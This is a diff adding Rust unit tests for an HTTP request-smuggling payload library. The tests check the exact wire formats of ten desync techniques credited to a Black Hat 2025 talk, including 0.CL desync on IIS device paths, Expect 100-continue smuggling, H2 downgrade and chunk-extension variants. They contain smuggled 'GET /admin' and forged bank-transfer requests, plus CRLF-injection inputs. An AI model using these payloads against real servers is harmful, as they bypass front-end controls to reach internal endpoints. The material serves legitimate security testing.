@@ -952,4 +952,623 @@ mod tests {
             "empty body must produce Content-Length: 0, got:\n{s}"
         );
     }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // Kettle BH USA 2025 — "HTTP/1.1 Must Die: The Desync Endgame" tests
+    // ═══════════════════════════════════════════════════════════════════════
+
+    /// `KETTLE_DESYNC_PRIMITIVES` registry must contain all 10 names.
+    #[test]
+    fn kettle_primitive_registry_complete() {
+        assert_eq!(
+            KETTLE_DESYNC_PRIMITIVES.len(),
+            10,
+            "registry must list all 10 Kettle BH25 primitives"
+        );
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"zero_cl_desync"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"vh_masked_header"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"expect_100_smuggle"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"expect_100_obfuscated"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"cl_zero_via_expect"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"double_desync"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"malformed_host_split"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"browser_powered_h2_downgrade"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"line_folded_header"));
+        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"chunk_extension_variants"));
+    }
+
+    // ── 1. zero_cl_desync ───────────────────────────────────────────────────
+
+    /// Exact wire format for `zero_cl_desync`.
+    #[test]
+    fn zero_cl_desync_exact_wire_format() {
+        let smuggled = "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n";
+        let p = zero_cl_desync("/con", smuggled, 38).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        // Method + reserved path.
+        assert!(
+            s.starts_with("GET /con HTTP/1.1\r\n"),
+            "must start with GET /<reserved-path>, got:\n{s}"
+        );
+        // Abbreviated host.
+        assert!(s.contains("Host: t\r\n"), "must have Host: t, got:\n{s}");
+        // Attack Content-Length.
+        assert!(
+            s.contains("Content-Length: 38\r\n"),
+            "must have Content-Length: 38, got:\n{s}"
+        );
+        // Smuggled request follows the blank line.
+        assert!(
+            s.contains(smuggled),
+            "smuggled request must appear in body, got:\n{s}"
+        );
+        assert_eq!(p.variant, SmugglingVariant::KettleDesync);
+    }
+
+    /// `zero_cl_desync` with empty smuggled body.
+    #[test]
+    fn zero_cl_desync_empty_smuggled_body() {
+        let p = zero_cl_desync("/nul", "", 0).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(s.contains("Content-Length: 0\r\n"));
+        assert!(s.contains("GET /nul HTTP/1.1\r\n"));
+    }
+
+    /// `zero_cl_desync` with IIS reserved paths.
+    #[test]
+    fn zero_cl_desync_iis_reserved_paths() {
+        for path in IIS_RESERVED_PATHS {
+            let p = zero_cl_desync(path, "X", 1).unwrap();
+            let s = String::from_utf8_lossy(&p.raw_bytes);
+            assert!(
+                s.contains(path),
+                "reserved path {path} must appear in payload, got:\n{s}"
+            );
+        }
+    }
+
+    /// `zero_cl_desync` rejects CRLF in path.
+    #[test]
+    fn zero_cl_desync_rejects_crlf_in_path() {
+        assert!(zero_cl_desync("/con\r\nX-Injected: 1", "payload", 10).is_err());
+        assert!(zero_cl_desync("/nul\nevil", "payload", 10).is_err());
+    }
+
+    /// `zero_cl_desync` with oversized CL — not an error (CL is caller-supplied).
+    #[test]
+    fn zero_cl_desync_large_attack_cl() {
+        let p = zero_cl_desync("/aux", "SMUGGLED", usize::MAX).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(s.contains(&format!("Content-Length: {}\r\n", usize::MAX)));
+    }
+
+    // ── 2. vh_masked_header ─────────────────────────────────────────────────
+
+    /// `vh_masked_header` returns exactly 2 variants.
+    #[test]
+    fn vh_masked_header_returns_two_variants() {
+        let variants = vh_masked_header("Host", "evil.internal");
+        assert_eq!(
+            variants.len(),
+            2,
+            "must return space-prefix + char-rewrite variants"
+        );
+    }
+
+    /// Space-prefix variant has a leading space before the header name.
+    #[test]
+    fn vh_masked_header_space_prefix_wire_format() {
+        let variants = vh_masked_header("Host", "evil.internal");
+        let space_variant = String::from_utf8_lossy(&variants[0].raw_bytes);
+        // The header line must start with a space (obs-fold / SP prefix).
+        assert!(
+            space_variant.contains("\r\n Host: evil.internal\r\n"),
+            "space-prefix variant must have ' Host: ...', got:\n{space_variant}"
+        );
+    }
+
+    /// Char-rewrite variant replaces the first character with 'X'.
+    #[test]
+    fn vh_masked_header_char_rewrite_wire_format() {
+        let variants = vh_masked_header("Host", "evil.internal");
+        let xname_variant = String::from_utf8_lossy(&variants[1].raw_bytes);
+        // "Host" → "Xost"
+        assert!(
+            xname_variant.contains("Xost: evil.internal\r\n"),
+            "char-rewrite must produce 'Xost: evil.internal', got:\n{xname_variant}"
+        );
+    }
+
+    /// `vh_masked_header` with empty header name — must not panic.
+    #[test]
+    fn vh_masked_header_empty_name_no_panic() {
+        let variants = vh_masked_header("", "value");
+        assert_eq!(variants.len(), 2, "must still return 2 variants for empty name");
+        // Space-prefix: " : value"
+        let s0 = String::from_utf8_lossy(&variants[0].raw_bytes);
+        assert!(s0.contains(": value\r\n"), "space-prefix must still produce header line");
+        // Char-rewrite: empty name → "X-Unknown"
+        let s1 = String::from_utf8_lossy(&variants[1].raw_bytes);
+        assert!(s1.contains("X-Unknown: value\r\n"), "char-rewrite with empty name must use X-Unknown");
+    }
+
+    // ── 3. expect_100_smuggle ───────────────────────────────────────────────
+
+    /// Exact wire format for `expect_100_smuggle`.
+    #[test]
+    fn expect_100_smuggle_exact_wire_format() {
+        let smuggled = "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n";
+        let p = expect_100_smuggle(smuggled, 44).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(
+            s.starts_with("GET /logout HTTP/1.1\r\n"),
+            "must use GET /logout, got:\n{s}"
+        );
+        assert!(s.contains("Expect: 100-continue\r\n"), "must have Expect header");
+        assert!(s.contains("Content-Length: 44\r\n"), "must have attack CL");
+        assert!(s.contains(smuggled), "smuggled request must appear in body");
+        assert_eq!(p.variant, SmugglingVariant::KettleDesync);
+    }
+
+    /// `expect_100_smuggle` with empty smuggled body.
+    #[test]
+    fn expect_100_smuggle_empty_body() {
+        let p = expect_100_smuggle("", 0).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(s.contains("Content-Length: 0\r\n"));
+        assert!(s.contains("Expect: 100-continue\r\n"));
+    }
+
+    // ── 4. expect_100_obfuscated ────────────────────────────────────────────
+
+    /// `expect_100_obfuscated` produces at least 9 variants.
+    #[test]
+    fn expect_100_obfuscated_variant_count() {
+        let variants = expect_100_obfuscated("", "", "SMUGGLED", 7).unwrap();
+        assert!(
+            variants.len() >= 9,
+            "must produce 6 prefix/suffix + 3 case variants = 9+, got {}",
+            variants.len()
+        );
+    }
+
+    /// All obfuscated variants have the Expect header present.
+    #[test]
+    fn expect_100_obfuscated_all_have_expect_header() {
+        let variants = expect_100_obfuscated("x-", "!", "PAYLOAD", 7).unwrap();
+        for v in &variants {
+            let s = String::from_utf8_lossy(&v.raw_bytes);
+            assert!(s.contains("Expect: "), "all variants must have Expect:, got:\n{s}");
+            assert!(s.contains("100"), "all variants must reference '100', got:\n{s}");
+        }
+    }
+
+    /// The "y 100-continue" Kettle-canonical variant is present.
+    #[test]
+    fn expect_100_obfuscated_y_prefix_variant_present() {
+        let variants = expect_100_obfuscated("", "", "SMUGGLED", 5).unwrap();
+        let has_y_prefix = variants.iter().any(|v| {
+            String::from_utf8_lossy(&v.raw_bytes).contains("Expect: y 100-continue\r\n")
+        });
+        assert!(has_y_prefix, "must include 'y 100-continue' variant");
+    }
+
+    /// `expect_100_obfuscated` with caller-supplied prefix/suffix (trailing tab).
+    #[test]
+    fn expect_100_obfuscated_caller_prefix_suffix() {
+        let variants = expect_100_obfuscated("CUSTOM-", "-SUFFIX", "BODY", 4).unwrap();
+        let has_custom = variants.iter().any(|v| {
+            String::from_utf8_lossy(&v.raw_bytes)
+                .contains("Expect: CUSTOM-100-continue-SUFFIX\r\n")
+        });
+        assert!(has_custom, "must include caller-supplied prefix/suffix variant");
+    }
+
+    // ── 5. cl_zero_via_expect ───────────────────────────────────────────────
+
+    /// Exact wire format for `cl_zero_via_expect`.
+    #[test]
+    fn cl_zero_via_expect_exact_wire_format() {
+        let smuggled = "GET /secret HTTP/1.1\r\nHost: internal\r\n\r\n";
+        let p = cl_zero_via_expect(smuggled, 42).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(
+            s.starts_with("POST /images/ HTTP/1.1\r\n"),
+            "must use POST /images/, got:\n{s}"
+        );
+        assert!(s.contains("Expect: 100-continue\r\n"), "must have Expect header");
+        assert!(s.contains("Content-Length: 42\r\n"), "must have CL=42");
+        assert!(s.contains(smuggled), "smuggled must appear in body");
+        assert_eq!(p.variant, SmugglingVariant::KettleDesync);
+    }
+
+    /// `cl_zero_via_expect` with empty smuggled body.
+    #[test]
+    fn cl_zero_via_expect_empty_body() {
+        let p = cl_zero_via_expect("", 0).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(s.contains("Content-Length: 0\r\n"));
+        assert!(s.starts_with("POST /images/ HTTP/1.1\r\n"));
+    }
+
+    // ── 6. double_desync ────────────────────────────────────────────────────
+
+    /// `double_desync` produces valid concatenated wire bytes.
+    #[test]
+    fn double_desync_contains_both_stages() {
+        let bytes = double_desync("/con", "/images/", "PAYLOAD").unwrap();
+        let s = String::from_utf8_lossy(&bytes);
+        // Stage 1: 0.CL desync on /con.
+        assert!(s.starts_with("GET /con HTTP/1.1\r\n"), "stage 1 must be GET /con");
+        // Stage 2 body embedded in stage 1's body.
+        assert!(s.contains("POST /images/ HTTP/1.1\r\n"), "stage 2 POST must appear");
+        // Payload appears after stage 2.
+        assert!(s.contains("PAYLOAD"), "caller payload must appear");
+        // Stage 1's Content-Length must equal the byte length of stage 2.
+        let stage2_body = format!(
+            "POST /images/ HTTP/1.1\r\n\
+             Host: t\r\n\
+             Content-Length: 0\r\n\
+             \r\n\
+             PAYLOAD"
+        );
+        let expected_cl = stage2_body.len();
+        assert!(
+            s.contains(&format!("Content-Length: {expected_cl}\r\n")),
+            "stage 1 CL must equal stage 2 byte length ({expected_cl}), got:\n{s}"
+        );
+    }
+
+    /// `double_desync` rejects CRLF in paths.
+    #[test]
+    fn double_desync_rejects_crlf_in_paths() {
+        assert!(double_desync("/con\r\nevil", "/images/", "X").is_err());
+        assert!(double_desync("/con", "/images/\nevil", "X").is_err());
+    }
+
+    /// `double_desync` with empty payload.
+    #[test]
+    fn double_desync_empty_payload() {
+        let bytes = double_desync("/nul", "/static/", "").unwrap();
+        let s = String::from_utf8_lossy(&bytes);
+        assert!(s.contains("GET /nul HTTP/1.1\r\n"));
+        assert!(s.contains("POST /static/ HTTP/1.1\r\n"));
+    }
+
+    // ── 7. malformed_host_split ─────────────────────────────────────────────
+
+    /// `malformed_host_split` returns one payload per delimiter (8).
+    #[test]
+    fn malformed_host_split_variant_count() {
+        let variants = malformed_host_split("foo");
+        assert_eq!(
+            variants.len(),
+            8,
+            "must produce 8 variants (one per delimiter), got {}",
+            variants.len()
+        );
+    }
+
+    /// All variants have a `Host:` header and end with `\r\n\r\n`.
+    #[test]
+    fn malformed_host_split_structure() {
+        for v in malformed_host_split("example.com") {
+            let s = String::from_utf8_lossy(&v.raw_bytes);
+            assert!(s.contains("Host: "), "must have Host: header, got:\n{s}");
+            assert!(
+                v.raw_bytes.ends_with(b"\r\n\r\n"),
+                "must end with CRLF CRLF, got:\n{s}"
+            );
+            assert_eq!(v.variant, SmugglingVariant::KettleDesync);
+        }
+    }
+
+    /// Delimiter characters are inserted into the host value.
+    #[test]
+    fn malformed_host_split_delimiters_present() {
+        let variants = malformed_host_split("bar");
+        let raw_strs: Vec<_> = variants
+            .iter()
+            .map(|v| String::from_utf8_lossy(&v.raw_bytes).to_string())
+            .collect();
+        // Each delimiter must appear in at least one variant's Host header.
+        for delim in &[':', '/', '\\', '?', '#', '@', '[', ']'] {
+            assert!(
+                raw_strs.iter().any(|s| s.contains(*delim)),
+                "delimiter {:?} must appear in some variant", delim
+            );
+        }
+    }
+
+    /// `malformed_host_split` with very short host (shorter than insert_pos=3).
+    #[test]
+    fn malformed_host_split_short_host() {
+        let variants = malformed_host_split("ab");
+        // Must not panic; all must have a Host header.
+        for v in &variants {
+            let s = String::from_utf8_lossy(&v.raw_bytes);
+            assert!(s.contains("Host: "), "short host must still produce Host header");
+        }
+    }
+
+    // ── 8. browser_powered_h2_downgrade ─────────────────────────────────────
+
+    /// `browser_powered_h2_downgrade` returns an H2Evasion with conflicting CL.
+    #[test]
+    fn browser_powered_h2_downgrade_structure() {
+        use crate::h2_evasion::H2TargetFlaw;
+        let evasion = browser_powered_h2_downgrade("POST", "/login", b"user=x", 10).unwrap();
+        // Must target protocol downgrade.
+        assert_eq!(evasion.target_flaw, H2TargetFlaw::ProtocolDowngrade);
+        // Pseudo-headers: :method, :path, :scheme.
+        let methods: Vec<_> = evasion.pseudo_headers.iter()
+            .filter(|(k, _)| k == ":method").collect();
+        assert_eq!(methods.len(), 1, "must have exactly one :method pseudo-header");
+        assert_eq!(methods[0].1, "POST");
+        // Conflicting content-length header.
+        let cl_headers: Vec<_> = evasion.headers.iter()
+            .filter(|(k, _)| k == "content-length").collect();
+        assert_eq!(cl_headers.len(), 1, "must have content-length header");
+        assert_eq!(cl_headers[0].1, "10", "declared_cl must be 10");
+        // Transfer-encoding: chunked for H2.TE.
+        let te_headers: Vec<_> = evasion.headers.iter()
+            .filter(|(k, _)| k == "transfer-encoding").collect();
+        assert_eq!(te_headers.len(), 1, "must have transfer-encoding header");
+        assert_eq!(te_headers[0].1, "chunked");
+    }
+
+    /// `browser_powered_h2_downgrade` rejects CRLF in method or path.
+    #[test]
+    fn browser_powered_h2_downgrade_rejects_crlf() {
+        assert!(browser_powered_h2_downgrade("GET\r\nX-Evil: 1", "/", b"", 0).is_err());
+        assert!(browser_powered_h2_downgrade("GET", "/path\r\nX-Evil: 1", b"", 0).is_err());
+    }
+
+    /// `browser_powered_h2_downgrade` with empty body.
+    #[test]
+    fn browser_powered_h2_downgrade_empty_body() {
+        let evasion = browser_powered_h2_downgrade("GET", "/", b"", 0).unwrap();
+        // end_stream should be None or Some(false) for empty body.
+        assert!(
+            evasion.end_stream == Some(false) || evasion.end_stream.is_none(),
+            "empty body must set end_stream=false or leave unset"
+        );
+        // x-body-frame must encode the terminating chunk.
+        let body_frame = evasion.headers.iter()
+            .find(|(k, _)| k == "x-body-frame")
+            .map(|(_, v)| v.as_str())
+            .unwrap_or("");
+        assert!(body_frame.contains("0\r\n\r\n"), "empty body must produce terminating chunk");
+    }
+
+    // ── 9. line_folded_header ────────────────────────────────────────────────
+
+    /// `line_folded_header` exact wire format.
+    #[test]
+    fn line_folded_header_exact_wire_format() {
+        let bytes = line_folded_header("Content-Length", "5", "EXTRA");
+        let s = String::from_utf8_lossy(&bytes);
+        let expected = "Content-Length: 5\r\n EXTRA\r\n";
+        assert_eq!(
+            s, expected,
+            "line_folded_header must produce exact obs-fold wire format"
+        );
+    }
+
+    /// Line-folded header with empty fold text.
+    #[test]
+    fn line_folded_header_empty_fold_text() {
+        let bytes = line_folded_header("X-Custom", "value", "");
+        let s = String::from_utf8_lossy(&bytes);
+        // Must have the obs-fold `\r\n ` even with empty fold text.
+        assert!(
+            s.contains("X-Custom: value\r\n \r\n"),
+            "must produce obs-fold even with empty fold_text, got:\n{s}"
+        );
+    }
+
+    /// Line-folded header round-trips through a lenient parser.
+    #[test]
+    fn line_folded_header_in_request_context() {
+        // Build a minimal request with a folded header and a real terminator.
+        let folded_cl = line_folded_header("Content-Length", "5", "more");
+        let mut raw = b"POST / HTTP/1.1\r\nHost: t\r\n".to_vec();
+        raw.extend_from_slice(&folded_cl);
+        raw.extend_from_slice(b"\r\nhello");
+        let s = String::from_utf8_lossy(&raw);
+        // The folded value must appear in the raw bytes.
+        assert!(s.contains("Content-Length: 5\r\n more\r\n"));
+    }
+
+    // ── 10. chunk_extension_variants ────────────────────────────────────────
+
+    /// `chunk_extension_variants` returns exactly 8 variants.
+    #[test]
+    fn chunk_extension_variants_count() {
+        let variants = chunk_extension_variants("SMUGGLED");
+        assert_eq!(
+            variants.len(),
+            8,
+            "must return exactly 8 chunk-extension variants, got {}",
+            variants.len()
+        );
+    }
+
+    /// Standard key=value extension variant wire format.
+    #[test]
+    fn chunk_extension_variants_standard_wire_format() {
+        let variants = chunk_extension_variants("BODY");
+        let standard = String::from_utf8_lossy(&variants[0].raw_bytes);
+        assert!(
+            standard.contains("1;x=y\r\nX\r\n"),
+            "standard variant must have '1;x=y\\r\\nX\\r\\n', got:\n{standard}"
+        );
+        assert!(standard.contains("0\r\n\r\nBODY"), "smuggled body must follow terminator");
+        assert_eq!(variants[0].variant, SmugglingVariant::ChunkExtension);
+    }
+
+    /// Tab-separated extension variant has `\t` between `;` and name.
+    #[test]
+    fn chunk_extension_variants_tab_extension() {
+        let variants = chunk_extension_variants("");
+        let tab_variant = String::from_utf8_lossy(&variants[1].raw_bytes);
+        assert!(
+            tab_variant.contains(";\t"),
+            "tab variant must have ';\\t' in chunk line, got:\n{tab_variant}"
+        );
+    }
+
+    /// Quoted-string extension variant preserves the semicolon inside quotes.
+    #[test]
+    fn chunk_extension_variants_quoted_string() {
+        let variants = chunk_extension_variants("Q");
+        let quoted = String::from_utf8_lossy(&variants[4].raw_bytes);
+        assert!(
+            quoted.contains(";x=\"y;z\"\r\nX\r\n"),
+            "quoted-string variant must preserve semicolon inside quotes, got:\n{quoted}"
+        );
+    }
+
+    /// All 8 variants use `Transfer-Encoding: chunked`.
+    #[test]
+    fn chunk_extension_variants_all_use_chunked_te() {
+        for v in chunk_extension_variants("PAYLOAD") {
+            let s = String::from_utf8_lossy(&v.raw_bytes);
+            assert!(
+                s.contains("Transfer-Encoding: chunked\r\n"),
+                "all variants must declare chunked TE, got:\n{s}"
+            );
+        }
+    }
+
+    /// All 8 variants contain the terminating chunk `0\r\n\r\n`.
+    #[test]
+    fn chunk_extension_variants_all_have_terminator() {
+        for v in chunk_extension_variants("END") {
+            assert!(
+                v.raw_bytes.windows(5).any(|w| w == b"0\r\n\r\n"),
+                "all variants must have terminating chunk, got:\n{}",
+                String::from_utf8_lossy(&v.raw_bytes)
+            );
+        }
+    }
+
+    // ── CVE / real-world adversarial payloads ───────────────────────────────
+
+    /// **CVE-class: IIS 0.CL desync** — reproduces the attack surface described
+    /// in Kettle's "$200k in 2 weeks" talk.  An ALB/CloudFront front-end ignores
+    /// Content-Length on IIS device paths; IIS back-end honors CL and reads the
+    /// smuggled request.  The smuggled `GET /admin` is the canonical HackerOne
+    /// report payload class.
+    #[test]
+    fn adversarial_iis_0cl_desync_cve_class() {
+        let smuggled = "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n";
+        let cl = smuggled.len();
+        let p = zero_cl_desync("/con", smuggled, cl).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        // Must be a GET to a device path.
+        assert!(s.starts_with("GET /con HTTP/1.1\r\n"));
+        // CL must match exactly the smuggled request length.
+        assert!(s.contains(&format!("Content-Length: {cl}\r\n")));
+        // Smuggled request must appear verbatim in the body.
+        let sep = s.find("\r\n\r\n").expect("header/body separator");
+        let body = &s[sep + 4..];
+        assert_eq!(body, smuggled, "body must be exactly the smuggled request");
+    }
+
+    /// **CVE-class: Expect 100-continue front-end bypass** — reproduces the
+    /// class of H1 desync where a load balancer responds to Expect immediately
+    /// and the back-end reads the body as the next request.  Canonical payload
+    /// from Kettle's PortSwigger blog series.
+    #[test]
+    fn adversarial_expect_100_frontend_bypass_cve_class() {
+        let smuggled = "POST /account/transfer HTTP/1.1\r\nHost: bank.internal\r\nContent-Length: 10\r\n\r\namount=999";
+        let cl = smuggled.len();
+        let p = expect_100_smuggle(smuggled, cl).unwrap();
+        let s = String::from_utf8_lossy(&p.raw_bytes);
+        assert!(s.contains("Expect: 100-continue\r\n"));
+        assert!(s.contains("POST /account/transfer HTTP/1.1\r\n"));
+        assert!(s.contains("amount=999"));
+    }
+
+    /// **CVE-class: H2.CL downgrade** — reproduces the browser-powered H2
+    /// desync where the proxy inherits a conflicting Content-Length.  This is
+    /// the mechanism behind several $30k–$80k HackerOne bounties from 2024–2025.
+    #[test]
+    fn adversarial_h2_cl_downgrade_cve_class() {
+        use crate::h2_evasion::H2TargetFlaw;
+        let body = b"GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n";
+        // Declared CL intentionally less than body — triggers H2.CL desync.
+        let declared_cl = 5;
+        let evasion = browser_powered_h2_downgrade("POST", "/api/data", body, declared_cl).unwrap();
+        assert_eq!(evasion.target_flaw, H2TargetFlaw::ProtocolDowngrade);
+        let cl_header = evasion.headers.iter()
+            .find(|(k, _)| k == "content-length")
+            .expect("content-length header must be present");
+        // The declared CL is 5 — intentionally shorter than the real body.
+        assert_eq!(cl_header.1, "5", "declared CL must be 5 (mismatched desync)");
+        // Both CL and TE present → H2.CL + H2.TE ambiguity.
+        let has_te = evasion.headers.iter().any(|(k, v)| k == "transfer-encoding" && v == "chunked");
+        assert!(has_te, "must have transfer-encoding: chunked for H2.TE desync");
+    }
+
+    // ── Concurrency stress ──────────────────────────────────────────────────
+
+    /// All Kettle BH25 primitives are safe to call from multiple threads
+    /// simultaneously and produce deterministic output (modulo canary).
+    #[test]
+    fn kettle_primitives_concurrency_stress() {
+        use std::thread;
+        let handles: Vec<_> = (0..10)
+            .map(|i| {
+                thread::spawn(move || {
+                    let seed = i * 13 + 7;
+                    for _ in 0..20 {
+                        // 1. zero_cl_desync
+                        let p = zero_cl_desync("/con", "GET /x HTTP/1.1", seed).unwrap();
+                        assert!(!p.raw_bytes.is_empty(), "zero_cl_desync must not be empty");
+
+                        // 2. vh_masked_header
+                        let vs = vh_masked_header("Host", "t");
+                        assert_eq!(vs.len(), 2, "vh_masked_header must return 2");
+
+                        // 3. expect_100_smuggle
+                        let p = expect_100_smuggle("GET /x HTTP/1.1", seed).unwrap();
+                        assert!(!p.raw_bytes.is_empty());
+
+                        // 4. expect_100_obfuscated
+                        let vs = expect_100_obfuscated("", "", "X", seed).unwrap();
+                        assert!(!vs.is_empty());
+
+                        // 5. cl_zero_via_expect
+                        let p = cl_zero_via_expect("GET /x HTTP/1.1", seed).unwrap();
+                        assert!(!p.raw_bytes.is_empty());
+
+                        // 6. double_desync
+                        let bytes = double_desync("/con", "/images/", "X").unwrap();
+                        assert!(!bytes.is_empty());
+
+                        // 7. malformed_host_split
+                        let vs = malformed_host_split("example.com");
+                        assert_eq!(vs.len(), 8);
+
+                        // 8. browser_powered_h2_downgrade
+                        let e = browser_powered_h2_downgrade("GET", "/", b"", 0).unwrap();
+                        assert_eq!(e.pseudo_headers.len(), 3);
+
+                        // 9. line_folded_header
+                        let bytes = line_folded_header("Content-Length", "5", "x");
+                        assert!(!bytes.is_empty());
+
+                        // 10. chunk_extension_variants
+                        let vs = chunk_extension_variants("X");
+                        assert_eq!(vs.len(), 8);
+                    }
+                })
+            })
+            .collect();
+        for h in handles {
+            h.join().expect("thread must not panic");
+        }
+    }
 }
